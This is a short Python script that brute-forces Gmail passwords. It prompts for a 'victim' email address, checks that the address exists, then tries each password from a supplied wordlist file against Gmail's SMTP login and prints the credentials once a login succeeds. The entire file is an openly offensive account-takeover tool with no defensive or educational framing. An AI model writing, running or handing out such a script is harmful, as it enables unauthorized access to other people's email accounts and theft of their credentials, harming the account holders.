import smtplib
import os
from validate_email import validate_email
from colored import fg, attr

green = fg("green")
red = fg("red")
reset = attr("reset")

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

victim_email = input("[*] Enter Email: ")

is_valid = validate_email(victim_email, verify=True)

if is_valid == True:
    file_path = input("[*] Enter Passwords File: ")
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            for password in f:
                try:
                    server.login(victim_email, password)
                except:
                    print(red + "[-] Password Not Found!")
                else:
                    print(green + "\n[+] Password Found!" + reset)
                    print("Email: " + victim_email)
                    print("Password: " + password.strip())
                    break
    else:
        print(red + "[-] File Not Found!")
else:
    print("[-] Gmail Not Found!")

input()
